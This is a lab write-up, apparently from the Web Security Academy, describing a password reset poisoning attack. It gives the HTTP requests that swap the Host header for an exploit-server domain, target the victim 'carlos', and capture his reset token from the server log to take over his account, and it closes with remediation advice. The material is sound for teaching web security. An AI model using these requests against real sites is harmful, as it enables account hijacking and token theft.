# Basic Password Reset Poisoning

## Description
This lab demonstrates a password reset poisoning vulnerability caused by insecure handling of the `Host` header.

The application uses the value of the `Host` header when generating password reset links.  
By manipulating this header, an attacker can force the application to generate a malicious reset URL pointing to an attacker-controlled domain.

When the victim clicks the poisoned link, the reset token gets leaked to the attacker.

---

## Goal
Take over Carlos's account by stealing his password reset token.

---

## Recon & Discovery

First, I requested a normal password reset link for my own account (`wiener`) to understand how the functionality works.

While checking the email sent by the application, I noticed that the reset link used the same value found in the `Host` header of the request.

Example:

```http
Host: 0a1200a604cd78c28026c6f400600080.web-security-academy.net
```

The generated reset link:

```text
https://0a1200a604cd78c28026c6f400600080.web-security-academy.net/forgot-password?temp-forgot-password-token=TOKEN
```

This indicated that the application trusted the `Host` header when building password reset URLs.

![Original Password Reset Email](images/Original%20Password%20Reset%20Email%20Containing%20the%20Legitimate%20Reset%20Link.png)

---

## Steps

### 1. Intercept the Password Reset Request

Using Burp Suite, I intercepted the password reset request for my own user (`wiener`).

Original request:

```http
POST /forgot-password HTTP/2
Host: 0a1200a604cd78c28026c6f400600080.web-security-academy.net

csrf=TOKEN&username=wiener
```

![Modified Host Header in Burp](images/Modified%20Host%20Header%20in%20Burp.png)

---

### 2. Modify the Host Header

I changed the `Host` header to my exploit server domain while still using my own account.

Modified request:

```http
POST /forgot-password HTTP/2
Host: exploit-0a3b003c0435787c8062c56b01ed00c7.exploit-server.net

csrf=TOKEN&username=wiener
```

After forwarding the request, I checked the email again and noticed that the password reset link now pointed to the exploit server instead of the original domain.

This confirmed the vulnerability.

![Poisoned Reset Email](images/Poisoned%20Reset%20Email.png)

---

### 3. Target Carlos

After confirming the issue, I modified the username parameter from `wiener` to `carlos`.

```http
POST /forgot-password HTTP/2
Host: exploit-0a3b003c0435787c8062c56b01ed00c7.exploit-server.net

csrf=TOKEN&username=carlos
```

![Sending Password Reset Request for Victim User](images/Sending%20Password%20Reset%20Request%20for%20Victim%20User%20%28Carlos%29.png)

---

### 4. Capture the Reset Token

When Carlos clicks the poisoned reset link, the request gets sent to the exploit server.

I checked the exploit server logs and found the password reset token inside the request.

```text
GET /forgot-password?temp-forgot-password-token=ugbbu9lku6pdmz662w2ss7wu39oua2xz
```

![Exploit Server Access Log Capturing Token](images/Exploit%20Server%20Access%20Log%20Capturing%20Token.png)

---

### 5. Reset Carlos's Password

I used the stolen token to access the password reset page and set a new password for Carlos's account.

![Accessing the Password Reset Page Using the Stolen Token](images/Accessing%20the%20Password%20Reset%20Page%20Using%20the%20Stolen%20Token.png)

---

### 6. Login as Carlos

Finally, I logged into Carlos's account using the new password.

![Logging in to Carlos Account with the New Password](images/Logging%20in%20to%20Carlos%20Account%20with%20the%20New%20Password.png)

---

### 7. Lab Solved

After resetting Carlos's password and logging into the account, the lab was successfully solved.

![Lab Successfully Solved Confirmation Page](images/Lab%20Successfully%20Solved%20Confirmation%20Page.png)

---

## Impact

This vulnerability allows attackers to hijack user accounts by stealing password reset tokens through manipulated password reset links.

---

## Root Cause

The application trusted user-controlled `Host` headers while generating password reset URLs.

---

## Remediation

- Do not trust user-supplied `Host` headers.
- Use a predefined trusted domain when generating reset links.
- Validate allowed domains before constructing URLs.
- Expire reset tokens after a short period.
- Implement rate limiting and monitoring for password reset requests.

---

## Skills Learned

- HTTP Host Header Injection
- Password Reset Poisoning
- Account Takeover
- Burp Suite Request Manipulation
- Exploit Server Abuse
